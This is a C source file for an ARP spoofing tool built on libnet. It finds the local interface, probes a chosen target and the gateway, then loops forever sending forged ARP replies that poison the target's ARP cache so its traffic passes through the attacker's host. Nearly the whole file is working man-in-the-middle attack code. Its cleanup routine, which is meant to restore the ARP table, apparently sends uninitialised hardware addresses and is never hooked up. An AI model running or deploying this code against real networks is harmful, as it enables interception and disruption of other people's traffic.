#include "arpspoof.h"

short __init_arpspoof__( char *iface, struct net *_net )
{   
    struct libnet_ether_addr *hw;
    if ( !(lt = libnet_init( LIBNET_LINK, iface, arpspoof_errbuf )) ) {
        return -1;
    }

    // hardware address of device
    if ( !(hw = libnet_get_hwaddr( lt )) ) {
        sprintf( arpspoof_errbuf, "%s", libnet_geterror( lt ) );
        return -1;
    }

    tty = isatty( 1 );
    sprintf( 
        _net->hw, "%02x:%02x:%02x:%02x:%02x:%02x",
            hw->ether_addr_octet[0],
            hw->ether_addr_octet[1],
            hw->ether_addr_octet[2],
            hw->ether_addr_octet[3],
            hw->ether_addr_octet[4],
            hw->ether_addr_octet[5]
    );

    if ( dev_addr( iface, _net->ip, IPV4, arpspoof_errbuf ) < 0 ) {
        return -1;
    }
    if ( dev_addr( iface, _net->nmask, MASK, arpspoof_errbuf ) < 0 ) {
        return -1;
    }
    
    _net->iface       = iface;
    _net->hosts_range = calc_hosts( _net->ip, _net->nmask );
    _net->start_ip    = net_off(    _net->ip, _net->nmask );
    _net->subnet      = calc_subnet( _net->nmask );
    return 0;
}

short arp_receiver_start( struct net *_net )
{
    int err;
    pthread_t thread;
    
    err = pthread_create(
        &thread,
        NULL,
        arp_receiver,
        (void *) _net
    );

    if ( err ) {
        sprintf( 
            arpspoof_errbuf, 
            "Error spawning arp_receiver() thread!\n" 
        );
        return -1;
    }
    v_out( VINF, "%s", "Arp receiver spawned successfully!\n" );
    mssleep( 0.5 );
    return 0;
}

void arp_clear_arp( void )
{
    uint8_t src_hw[6];
    uint8_t dst_hw[6];
    uint8_t src_ip[4];
    uint8_t dst_ip[4];

    cnvrt_ip2b( endpoints.gateway, src_ip );
    cnvrt_ip2b( endpoints.target,  dst_ip );

    v_out( VINF, "%s", "Restoring arp table...\n" );
    for ( char i = 0 ; i < 5 ; i++ ) {
        arp_inject(
            lt, ARPOP_REPLY, src_hw, src_ip, dst_hw, dst_ip
        );
        sleep( 1 );
    }
    printf( "\n" );
}

void __spoof( char *self_hw )
{
    uint8_t src_hw[6];
    uint8_t dst_hw[6];
    uint8_t src_ip[4];
    uint8_t dst_ip[4];

    cnvrt_hw2b( self_hw,             src_hw );
    cnvrt_hw2b( endpoints.target_hw, dst_hw );
    cnvrt_ip2b( endpoints.gateway,   src_ip );
    cnvrt_ip2b( endpoints.target,    dst_ip );

    for ( ;; ) {
        arp_inject(
            lt, ARPOP_REPLY, src_hw, src_ip, dst_hw, dst_ip
        );
        sleep( 2 );
    }
}

void list_endpoints( char *iface )
{
    struct endpoint *endps = _endps;

    if ( lookup_arp( iface, NULL, NULL ) < 0 )
        __die( arpspoof_errbuf );
    
    v_out( VINF, "%s", "Listing endpoints...\n" );
    for ( uint32_t i = 0 ; i < live_hosts ; i++ ){
        v_out( VINF, "%s\n", (endps++)->host_ip );
    }
}

void arpspoof( struct net *_net, struct spf_endpoints *_spf )
{
    short t;
    t = strcmp( _spf->target, "0" );
    switch ( t ) {
        case 0:
            v_out( VWARN, "%s", "Target not specified!\n" );
            v_out( VINF, "%s", "Refreshing arp table...\n" );
            arp_refresh( _net );

            list_endpoints( _net->iface );
            v_out( VINF, "%s", "Choose target to spoof...\n" );
            scanf( "%s", _spf->target );
            break;
        
        default:
            if ( arp_receiver_start( _net ) < 0 )
                __die( arpspoof_errbuf );
            
            v_out( VINF, "%s", "Probing target...\n" );
            probe_endpoint( _spf->target, _net );

            v_out( VINF, "%s", "Probing gateway...\n" );
            probe_endpoint( _spf->gateway, _net );
            break;
    }
    
    if ( lookup_arp( _net->iface, _spf->target, _spf->target_hw ) < 0 ) 
            __die( arpspoof_errbuf );

    if ( lookup_arp( _net->iface, _spf->gateway, _spf->gateway_hw ) < 0 )
            __die( arpspoof_errbuf );
        
    if ( strlen( _spf->target_hw ) <= 0 )
        __die( "Target not found!\n" );
    

    // signal( SIGINT,  arp_clear_arp );
    // signal( SIGTERM, arp_clear_arp );
    __spoof( _net->hw );
}